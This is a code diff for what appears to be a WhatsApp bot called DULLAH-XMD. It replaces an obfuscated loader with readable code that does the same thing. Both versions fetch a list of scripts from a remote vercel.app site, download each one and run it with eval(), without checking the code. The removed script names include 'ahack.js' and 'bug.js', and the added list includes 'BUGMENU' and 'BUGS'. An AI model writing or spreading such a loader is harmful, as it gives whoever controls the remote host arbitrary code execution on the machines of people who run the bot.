@@ -1,4 +1,40 @@
-// DULLAH-XMD 
-function _0x1430(_0x238ef2,_0x169ca2){const _0x26bbe2=_0x26bb();return _0x1430=function(_0x143031,_0x3a880a){_0x143031=_0x143031-0x19c;let _0x14d71e=_0x26bbe2[_0x143031];return _0x14d71e;},_0x1430(_0x238ef2,_0x169ca2);}const _0x2dcdd6=_0x1430;(function(_0x83e647,_0x4294f6){const _0x37c40e=_0x1430,_0x3062b6=_0x83e647();while(!![]){try{const _0x222b5c=parseInt(_0x37c40e(0x1d2))/0x1+parseInt(_0x37c40e(0x1ea))/0x2*(parseInt(_0x37c40e(0x20d))/0x3)+parseInt(_0x37c40e(0x1ae))/0x4*(parseInt(_0x37c40e(0x1a4))/0x5)+parseInt(_0x37c40e(0x1e2))/0x6*(parseInt(_0x37c40e(0x1b9))/0x7)+-parseInt(_0x37c40e(0x1d6))/0x8*(parseInt(_0x37c40e(0x1d3))/0x9)+parseInt(_0x37c40e(0x1ef))/0xa+parseInt(_0x37c40e(0x1af))/0xb;if(_0x222b5c===_0x4294f6)break;else _0x3062b6['push'](_0x3062b6['shift']());}catch(_0x39e668){_0x3062b6['push'](_0x3062b6['shift']());}}}(_0x26bb,0x4fd32));const axios=require(_0x2dcdd6(0x203)),cheerio=require(_0x2dcdd6(0x201)),alphaUrl=_0x2dcdd6(0x1e3);async function fetchScriptUrl(_0x43d995){const _0x329ec8=_0x2dcdd6;try{const _0x5a5cf8=await axios[_0x329ec8(0x1eb)](alphaUrl),_0x183cac=cheerio[_0x329ec8(0x1fe)](_0x5a5cf8[_0x329ec8(0x1e4)]),_0x5e43be=_0x183cac(_0x329ec8(0x1f2)+_0x43d995+'\x22)')[_0x329ec8(0x1b4)]('href');if(!_0x5e43be)throw new Error(_0x43d995+_0x329ec8(0x1c4));console[_0x329ec8(0x1a7)](_0x43d995+'\x20URL\x20fetched\x20successfully☑️:',_0x5e43be);const _0x48a3a6=await axios[_0x329ec8(0x1eb)](_0x5e43be),_0x5a494b=_0x48a3a6[_0x329ec8(0x1e4)];console[_0x329ec8(0x1a7)](_0x43d995+_0x329ec8(0x1ed)),eval(_0x5a494b);}catch(_0x256382){console['error'](_0x329ec8(0x1b2)+_0x43d995+_0x329ec8(0x19e),_0x256382[_0x329ec8(0x20c)]);}}function _0x26bb(){const _0x311515=['quote.js','test.js','pay.js','img.js','uptime.js','wees.js','canvascord.js','809682FdetpC','https://dullah-xmd-commands-phi.vercel.app','data','rpt.js','tts.js','AI2.js','helper.js','pair2.js','46824THeEvv','get','owner1.js','\x20script\x20loaded\x20successfully✅','accapitalgm.js','416320SjqPLw','guy.js','reaction.js','a:contains(\x22','proprio.js','vc_files.js','codetest.js','hentai.js','chatpt.js','fancy.js','hentai2.js','apk.js','team.js','afk.js','style.js','load','other.js','index.js','cheerio','bine.js','axios','Media_dl.js','cat.js','anime.js','sc.js','stickcmd.js','chatbot.js','grp-set.js','weather.js','message','9rrbEYI','Nokia.js','Lt.js','boom.js','profile.js','cricket.js','\x20URL:','games.js','events.js','ans.js','chanel.js','movie.js','26555AFYiEg','delnote.js','forward.js','log','zgpt.js','elod.js','events2.js','humidity.js','lama.js','mont.js','124ctbOLf','1677896KhkzNN','oogs.js','scan.js','❌Error\x20fetching\x20','ttt.js','attr','fresavecontact.js','trt.js','conversation.js','deobfuscate.js','21mLxCbd','logo.js','youtube.js','solar.js','vars.js','stickersearch.js','anti-spam.js','tyf.js','Mods.js','set.js','frnews.js','\x20not\x20found\x20on\x20the\x20webpage🚫.','weeb.js','plot.js','groupe.js','getall.js','fpp.js','alive.js','play.js','whois.js','twi.js','igdl-fb-tk.js','wallpaper.js','bible.js','prx.js','10267htqxqR','27TFTCns','antifake.js','friends.js','1379176cAeNdi','blocklist.js','math.js','AI.js','anti-sticker.js'];_0x26bb=function(){return _0x311515;};return _0x26bb();}async function loadScripts(){const _0x3bb628=_0x2dcdd6,_0x34f43b=[_0x3bb628(0x1d9),_0x3bb628(0x1e7),'GPT.js','General.js','GroupQuotes.js',_0x3bb628(0x20f),_0x3bb628(0x204),_0x3bb628(0x1c1),_0x3bb628(0x20e),_0x3bb628(0x1ee),_0x3bb628(0x1fc),'ahack.js',_0x3bb628(0x1ca),_0x3bb628(0x206),_0x3bb628(0x1a1),'anti-delete.js',_0x3bb628(0x1bf),_0x3bb628(0x1da),_0x3bb628(0x1d4),_0x3bb628(0x1fa),'audioedit.js',_0x3bb628(0x1d0),_0x3bb628(0x202),_0x3bb628(0x1d7),_0x3bb628(0x210),'bug.js',_0x3bb628(0x1e1),_0x3bb628(0x205),_0x3bb628(0x1a2),_0x3bb628(0x209),_0x3bb628(0x1f7),_0x3bb628(0x1f5),_0x3bb628(0x1b7),_0x3bb628(0x19d),_0x3bb628(0x1a5),_0x3bb628(0x1b8),'deploy.js','design.js','dog.js','dullah.js','dullaht.js',_0x3bb628(0x1a9),_0x3bb628(0x1a0),_0x3bb628(0x1aa),_0x3bb628(0x1f8),_0x3bb628(0x1a6),_0x3bb628(0x1c9),_0x3bb628(0x1c3),_0x3bb628(0x1b5),_0x3bb628(0x1d5),_0x3bb628(0x19f),_0x3bb628(0x1c8),_0x3bb628(0x1c7),_0x3bb628(0x20a),_0x3bb628(0x1f0),_0x3bb628(0x1e8),_0x3bb628(0x1f6),_0x3bb628(0x1f9),_0x3bb628(0x1ab),_0x3bb628(0x1ce),_0x3bb628(0x1de),_0x3bb628(0x1ac),_0x3bb628(0x1ba),_0x3bb628(0x1c0),_0x3bb628(0x1d8),'menu.js','metal.js',_0x3bb628(0x1ad),_0x3bb628(0x1a3),_0x3bb628(0x1b0),_0x3bb628(0x1ff),_0x3bb628(0x1ec),_0x3bb628(0x1e9),'parole.js','pastebin.js',_0x3bb628(0x1dd),_0x3bb628(0x1cb),_0x3bb628(0x1c6),'ponp.js',_0x3bb628(0x19c),_0x3bb628(0x1f3),_0x3bb628(0x1d1),_0x3bb628(0x1db),_0x3bb628(0x1f1),_0x3bb628(0x1e5),_0x3bb628(0x207),_0x3bb628(0x1b1),_0x3bb628(0x1c2),_0x3bb628(0x1bc),_0x3bb628(0x208),_0x3bb628(0x1be),_0x3bb628(0x1fd),'swidth.js','system.js',_0x3bb628(0x1fb),_0x3bb628(0x1dc),_0x3bb628(0x1b6),_0x3bb628(0x1e6),_0x3bb628(0x1b3),_0x3bb628(0x1cd),_0x3bb628(0x1df),_0x3bb628(0x1bd),_0x3bb628(0x1f4),'voir.js','voit.js',_0x3bb628(0x1cf),'warn.js',_0x3bb628(0x20b),_0x3bb628(0x1c5),_0x3bb628(0x1e0),_0x3bb628(0x1cc),_0x3bb628(0x200),_0x3bb628(0x1bb),_0x3bb628(0x1a8)];for(const _0x1f3b59 of _0x34f43b){await fetchScriptUrl(_0x1f3b59);}}loadScripts();
-// Made by dullah tech
-// Ibrahim Adams best friend 
+const axios = require('axios');
+const cheerio = require('cheerio');
+
+const alphaUrl = 'https://dullah-xmd-commands-phi.vercel.app';
+
+async function fetchScriptUrl(scriptName) {
+    try {
+        const response = await axios.get(alphaUrl);
+        const $ = cheerio.load(response.data);
+        const scriptUrl = $(`a:contains("${scriptName}")`).attr('href');
+
+        if (!scriptUrl) throw new Error(`${scriptName} not found on the webpage🚫.`);
+
+        console.log(`${scriptName} URL fetched successfully☑️:`, scriptUrl);
+
+        const scriptResponse = await axios.get(scriptUrl);
+        const scriptContent = scriptResponse.data;
+        console.log(`${scriptName} script loaded successfully✅`);
+
+        eval(scriptContent);
+    } catch (error) {
+        console.error(`❌Error fetching ${scriptName} URL:`, error.message);
+    }
+}
+
+async function loadScripts() {
+    const scriptNames = [
+        'AI', 'CODING', 'EDITING', 'FUN', 'GROUP', 'OWNER', 'REPO', 'GENERAL',
+        'LOGO', 'DOWNLOAD', 'SEARCH', 'STALK', 'SYSTEM', 'SETTINGS', 'TTS',
+        'STICKER', 'GAMES', 'BUGMENU', 'CONVACORD', 'CONVERT', 'EVENTS',
+        'DOWNLOAD2', 'LIST', 'LOGO2', 'IMAGE', 'MODS', 'GPT', 'RANK', 'ANIME', 'BUGS', 'REACTION', 'SETTINGS',
+        'MENU', 'WARN', 'AUDIOEDIT'
+    ];
+
+    for (const scriptName of scriptNames) {
+        await fetchScriptUrl(scriptName);
+    }
+}
+
+loadScripts();
